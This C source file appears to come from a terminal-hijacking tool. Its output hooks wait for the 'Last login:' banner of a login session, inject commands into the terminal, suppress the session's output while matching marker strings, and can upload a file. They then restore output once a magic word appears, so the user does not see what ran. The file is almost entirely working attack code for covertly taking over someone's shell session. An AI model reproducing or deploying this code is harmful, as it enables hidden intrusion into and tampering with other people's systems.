#include <string.h>

#include "output-hooks.h"
#include "inject-cmd.h"
#include "upload.h"
#include "utils.h"

#include "tas/tas.h"
#include "debug.h"

// first stage, wait for 'Last login: *' message,
// then write some commands that are defined in inject-cmd.c
void wait_last_login(void *ptr, char **chunk, size_t *bufsize)
{
	static char *search = "Last login: ";
	static int pos = 0, ignore = 0;

	tas_tty *tty = ptr;
	char *buf = *chunk;

	int m = 0;

start_search:
	debug("search = %p", search);
	hexdump(search, strlen(search));

	debug("match(buf, %zu, search, &pos)\r\nbuf = %p", *bufsize - m, buf);
	hexdump(buf, *bufsize - m);

	if ((m = match(buf, *bufsize - m, search, &pos))) {
		if (!ignore) {
			ignore = 1;

			buf += m;
			pos = 0;

			search = "\r\n";
			goto start_search;
		} else {
			inject_cmd(tty->master);
			tty->output_hook = wait_answer;

			*bufsize = buf - *chunk + m;

			debug("buf output:");
			hexdump(*chunk, *bufsize);
		}
	}
}

// second stage, supress all output and wait the
// result of the command line, then start upload itself
// or go to the final stage
void wait_answer(void *ptr, char **chunk, size_t *bufsize)
{
	static int pos1 = 0, pos2 = 0;

	tas_tty *tty = ptr;
	char *buf = *chunk;

	int m;

	debug("buf:");
	hexdump(buf, *bufsize);

	if (!(m = match(buf, *bufsize, "1nj3ct0\r\n", &pos1))) {
		if (!(m = match(buf, *bufsize, "1nj3ct1\r\n", &pos2))) {
			goto end;
		}

		debug("start file uploading...");
		sleep(3);
		uploadme(tty->master);
		debug("file upload finish");
	}

	tty->output_hook = wait_magic;

	*chunk += m;
	*bufsize -= m;

	return wait_magic(ptr, chunk, bufsize);

end:
	*bufsize = 0;
}

// final stage, wait for the magic word and set output_hook to NULL
void wait_magic(void *ptr, char **chunk, size_t *bufsize)
{
	static int pos = 0;

	tas_tty *tty = ptr;
	char *buf = *chunk;
	int m;

	debug("buf:");
	hexdump(buf, *bufsize);

	if ((m = match(buf, *bufsize, MAGIC "\r\n", &pos))) {
		tty->output_hook = NULL;

		*chunk = buf + m;
		*bufsize -= m;

		debug("buf output:");
		hexdump(*chunk, *bufsize);

		debug("setting output_hook to NULL, all done");
		return;
	}

	*bufsize = 0;
}
